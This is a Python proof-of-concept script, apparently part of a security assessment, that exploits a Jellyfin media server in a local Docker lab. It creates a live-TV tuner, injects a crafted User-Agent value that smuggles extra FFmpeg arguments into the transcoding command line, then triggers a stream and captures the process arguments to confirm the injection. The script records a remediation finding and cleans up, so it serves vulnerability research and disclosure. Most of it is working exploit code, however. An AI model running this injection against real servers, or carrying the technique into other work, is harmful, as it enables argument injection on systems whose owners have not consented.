#!/usr/bin/env python3
"""
COBALT STRIKE II -- Phase 2e: FFmpeg Command Line Capture
End-to-end proof: Create tuner, inject UA, trigger transcoding, capture FFmpeg args.
"""

import sys
sys.path.insert(0, '/home/[REDACTED]/Desktop/[REDACTED-PATH]/JellyFin/scripts')

from jellyfin_common import *
import subprocess
import time
import urllib.parse
import threading

banner("Phase 2e: FFmpeg Command Line Capture")

ec = EvidenceCollector("phase2e_cmdline_capture", phase="phase2")
js = JellyfinSession()

if not js.test_connection():
    print("[-] Cannot connect to Jellyfin")
    sys.exit(1)

M3U_URL = "http://[REDACTED-INTERNAL-IP]:9999/test_iptv.m3u"


# ===========================================================================
# STEP 1: Create tuner with clean UA and discover channels
# ===========================================================================

print("\n" + "=" * 60)
print("  STEP 1: Create Tuner & Discover Channels")
print("=" * 60)

data = {
    "Url": M3U_URL,
    "Type": "M3U",
    "FriendlyName": "PoC Tuner",
    "UserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0",
    "TunerCount": 1,
}
resp = js.post("/LiveTv/TunerHosts", data=data)
print(f"\n  Create tuner: HTTP {resp.status_code}")

if resp.status_code != 200:
    print(f"  Error: {resp.text[:200]}")
    sys.exit(1)

tuner_id = resp.json().get("Id", "")
print(f"  Tuner ID: {tuner_id}")

# Refresh channels
time.sleep(1)
tasks_resp = js.get("/ScheduledTasks")
if tasks_resp.status_code == 200:
    for task in tasks_resp.json():
        if "channels" in task.get("Name", "").lower() or "guide" in task.get("Name", "").lower():
            js.post(f"/ScheduledTasks/Running/{task['Id']}")

time.sleep(3)

# Get channels
channels_resp = js.get("/LiveTv/Channels")
channels = channels_resp.json().get("Items", []) if channels_resp.status_code == 200 else []
print(f"  Found {len(channels)} channel(s)")

if not channels:
    print("  No channels found, aborting")
    js.delete(f"/LiveTv/TunerHosts?id={tuner_id}")
    sys.exit(1)

channel_id = channels[0]["Id"]
channel_name = channels[0].get("Name", "?")
print(f"  Channel: {channel_name} (ID: {channel_id})")


# ===========================================================================
# STEP 2: Inject malicious UA into tuner config
# ===========================================================================

print("\n" + "=" * 60)
print("  STEP 2: Inject Malicious User-Agent")
print("=" * 60)

INJECT_UA = 'Mozilla/5.0" -loglevel verbose -report -i "'

config_resp = js.get("/System/Configuration/livetv")
if config_resp.status_code == 200:
    config = config_resp.json()
    for th in config.get("TunerHosts", []):
        if th.get("Id") == tuner_id:
            th["UserAgent"] = INJECT_UA
            print(f"  Updated UserAgent: {INJECT_UA}")

    save_resp = js.post("/System/Configuration/livetv", data=config)
    print(f"  Save config: HTTP {save_resp.status_code}")

    # Verify
    time.sleep(0.5)
    verify_resp = js.get("/System/Configuration/livetv")
    if verify_resp.status_code == 200:
        for th in verify_resp.json().get("TunerHosts", []):
            if th.get("Id") == tuner_id:
                print(f"  Confirmed stored UA: {th.get('UserAgent', '?')}")


# ===========================================================================
# STEP 3: Set up FFmpeg monitoring inside container
# ===========================================================================

print("\n" + "=" * 60)
print("  STEP 3: Monitor FFmpeg Process")
print("=" * 60)

# Set up a monitoring script inside the container
monitor_script = """
#!/bin/bash
for i in $(seq 1 20); do
    for pid in $(pgrep -f ffmpeg 2>/dev/null); do
        echo "FOUND PID $pid at $(date +%s)"
        cat /proc/$pid/cmdline 2>/dev/null | tr '\\0' '\\n'
        echo "END_CMDLINE"
    done
    sleep 0.5
done
"""

# Write monitor script
subprocess.run(
    ["docker", "exec", "cobalt-jellyfin", "bash", "-c",
     f"cat > /tmp/monitor_ffmpeg.sh << 'SCRIPT'\n{monitor_script}\nSCRIPT\nchmod +x /tmp/monitor_ffmpeg.sh"],
    capture_output=True, text=True, timeout=5,
)

# Start monitor in background
monitor_proc = subprocess.Popen(
    ["docker", "exec", "cobalt-jellyfin", "bash", "/tmp/monitor_ffmpeg.sh"],
    stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
)
print("  FFmpeg monitor started")


# ===========================================================================
# STEP 4: Trigger transcoding by requesting stream
# ===========================================================================

print("\n" + "=" * 60)
print("  STEP 4: Trigger Transcoding")
print("=" * 60)

# First get the master playlist
print("\n  Fetching master playlist...")
master_resp = js.get(f"/Videos/{channel_id}/master.m3u8", params={
    "MediaSourceId": channel_id,
    "VideoCodec": "h264",
    "AudioCodec": "aac",
    "SegmentContainer": "ts",
    "static": "false",
    "MaxStreamingBitrate": "500000",
})
print(f"  Master playlist: HTTP {master_resp.status_code}")
if master_resp.status_code == 200:
    print(f"  Content:\n{master_resp.text[:400]}")

    # Parse the live.m3u8 URL from the master playlist
    for line in master_resp.text.split("\n"):
        if "live.m3u8" in line:
            live_url = line.strip()
            if not live_url.startswith("http"):
                live_url = f"/Videos/{channel_id}/{live_url}"
            print(f"\n  Fetching segment playlist: {live_url[:120]}")

            # Fetch the segment playlist to trigger actual FFmpeg
            seg_resp = js.get(live_url)
            print(f"  Segment playlist: HTTP {seg_resp.status_code}")
            if seg_resp.status_code == 200:
                print(f"  Content:\n{seg_resp.text[:400]}")
            break

# Wait for FFmpeg to start
print("\n  Waiting for FFmpeg to start...")
time.sleep(5)


# ===========================================================================
# STEP 5: Capture FFmpeg command line
# ===========================================================================

print("\n" + "=" * 60)
print("  STEP 5: Capture FFmpeg Command Line")
print("=" * 60)

# Kill monitor and read output
try:
    monitor_proc.terminate()
    stdout, stderr = monitor_proc.communicate(timeout=5)
except:
    stdout = ""

if stdout.strip():
    print("\n  FFmpeg monitor output:")
    in_cmdline = False
    cmdline_args = []
    for line in stdout.strip().split("\n"):
        line = line.strip()
        if line.startswith("FOUND PID"):
            print(f"\n  {line}")
            in_cmdline = True
            cmdline_args = []
        elif line == "END_CMDLINE":
            in_cmdline = False
            if cmdline_args:
                full_cmd = " ".join(cmdline_args)
                print(f"  Full command ({len(full_cmd)} chars):")
                for arg in cmdline_args:
                    print(f"    {arg[:200]}")

                # Check for injection markers
                if "-report" in full_cmd or "verbose" in full_cmd:
                    print(f"\n  [!!] INJECTION CONFIRMED IN FFMPEG COMMAND LINE!")
                    print(f"  [!!] The -loglevel verbose and -report flags were injected")
                    ec.add_finding(
                        "FFMPEG-UA-CMDLINE",
                        "CRITICAL",
                        "FFmpeg argument injection confirmed in command line",
                        f"The User-Agent field from tuner config was injected into "
                        f"the FFmpeg command line. Injected UA: {INJECT_UA}. "
                        f"Full FFmpeg command: {full_cmd[:1000]}",
                        evidence=full_cmd[:2000],
                        remediation=(
                            "Sanitize User-Agent/Referer values before passing to FFmpeg. "
                            "Use ProcessStartInfo.ArgumentList or escape double quotes."
                        ),
                    )

                if "-user_agent" in full_cmd or "-user-agent" in full_cmd:
                    idx = full_cmd.find("-user_agent")
                    if idx == -1:
                        idx = full_cmd.find("-user-agent")
                    ua_section = full_cmd[idx:idx+300]
                    print(f"\n  User-Agent section: {ua_section[:200]}")
        elif in_cmdline:
            cmdline_args.append(line)
else:
    print("  No FFmpeg processes captured by monitor")

    # Direct check
    result = subprocess.run(
        ["docker", "exec", "cobalt-jellyfin", "bash", "-c",
         "for pid in $(pgrep -f ffmpeg 2>/dev/null); do "
         "echo 'PID '$pid; "
         "cat /proc/$pid/cmdline 2>/dev/null | tr '\\0' ' '; "
         "echo; done"],
        capture_output=True, text=True, timeout=10,
    )
    if result.stdout.strip():
        print(f"  Direct check found FFmpeg:")
        print(f"  {result.stdout[:500]}")
    else:
        print("  No FFmpeg process found via direct check either")

    # Check container logs for FFmpeg command
    result2 = subprocess.run(
        ["docker", "logs", "--tail", "50", "cobalt-jellyfin"],
        capture_output=True, text=True, timeout=10,
    )
    ffmpeg_lines = [l for l in result2.stdout.split("\n")
                    if "ffmpeg" in l.lower() or "user_agent" in l.lower() or "user-agent" in l.lower()]
    if ffmpeg_lines:
        print(f"\n  FFmpeg mentions in container logs:")
        for line in ffmpeg_lines[-10:]:
            print(f"    {line[:200]}")


# ===========================================================================
# STEP 6: Also check transcoding log from Jellyfin
# ===========================================================================

print("\n" + "=" * 60)
print("  STEP 6: Check Jellyfin Transcoding Logs")
print("=" * 60)

# Jellyfin logs FFmpeg commands
result = subprocess.run(
    ["docker", "exec", "cobalt-jellyfin", "bash", "-c",
     "find /config/log -name '*.log' -newer /tmp/monitor_ffmpeg.sh 2>/dev/null | head -5"],
    capture_output=True, text=True, timeout=10,
)
print(f"  Recent log files: {result.stdout.strip()}")

# Check all recent logs for FFmpeg command lines
result2 = subprocess.run(
    ["docker", "exec", "cobalt-jellyfin", "bash", "-c",
     "grep -r 'user.agent\\|ffmpeg\\|-user_agent\\|Starting FFmpeg' /config/log/ 2>/dev/null | tail -20"],
    capture_output=True, text=True, timeout=10,
)
if result2.stdout.strip():
    print(f"\n  FFmpeg references in logs:")
    for line in result2.stdout.strip().split("\n"):
        print(f"    {line[:250]}")
        if INJECT_UA[:20] in line or "-report" in line or "verbose" in line:
            print(f"    [!!] INJECTION PAYLOAD FOUND IN LOG!")


# ===========================================================================
# CLEANUP
# ===========================================================================

print("\n" + "=" * 60)
print("  CLEANUP")
print("=" * 60)

js.delete(f"/LiveTv/TunerHosts?id={tuner_id}")
print(f"  Deleted tuner: {tuner_id}")

# Kill HTTP server
try:
    with open("/tmp/http_server_pid.txt") as f:
        pid = f.read().strip()
    subprocess.run(["kill", pid], capture_output=True, timeout=5)
    print(f"  Killed HTTP server")
except:
    pass


# ===========================================================================
# SUMMARY
# ===========================================================================

print("\n" + "=" * 60)
print("  PHASE 2e SUMMARY")
print("=" * 60)

ec.save()
